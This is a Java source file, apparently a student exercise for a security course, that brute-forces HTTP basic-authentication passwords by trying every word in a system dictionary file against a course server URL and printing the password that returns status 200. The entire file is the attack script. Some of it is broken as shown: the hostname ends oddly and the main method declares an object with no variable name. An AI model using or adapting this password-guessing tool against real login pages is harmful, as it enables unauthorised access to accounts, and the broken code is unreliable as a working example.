import java.io.*;
import java.util.*;
import java.net.*;
import java.net.Authenticator;


public class  Dictionary
{

	private String result ="";

	public class customAuthenticator extends Authenticator {
	       public customAuthenticator(String passwd)
           {
            this.pass = passwd;
           }

	       protected PasswordAuthentication getPasswordAuthentication()
           {
	                 return new PasswordAuthentication("",pass.toCharArray());
           }
           public String pass;
    }

    public Dictionary() {

        DataInputStream dis = null;
        String record = null;
        int recCount = 0, flag=0;
	    String result="";
        java.util.Date d = java.util.Calendar.getInstance().getTime();
        System.out.println(d.toString());


        String url = "http://sec-crack.cs.rmit.edu./SEC/2/";


		int count=1;
		String passwd=new String();
        HttpURLConnection connection = null;
        URL u = null;

        try
        {
         u = new URL(url);
         File f = new File("/usr/share/lib/dict/words");
         FileInputStream fis = new FileInputStream(f);
         BufferedInputStream bis = new BufferedInputStream(fis);
         dis = new DataInputStream(bis);

                while ( (record=dis.readLine()) != null )
		            {
		              System.out.println(count+ " ) " + record);
                      count++;
                      connection = (HttpURLConnection) u.openConnection();
                      Authenticator.setDefault(new customAuthenticator(record));
                        if (connection.getResponseCode()==200)
                            {   System.out.print("The password is : "+record);
                                System.out.println();
                                java.util.Date d1 = java.util.Calendar.getInstance().getTime();
                                System.out.println(d1.toString());
                                System.out.println("\ntime taken in seconds:"+ (d1.getTime() - d.getTime())/1000+"\n");
                                System.exit(0);
                            }

                    connection.disconnect();
                        }
                }
            catch(Exception e) { System.err.println(e); }
    }

	public static void main(String[] args)
	{

		Dictionary  = new Dictionary();


	}
}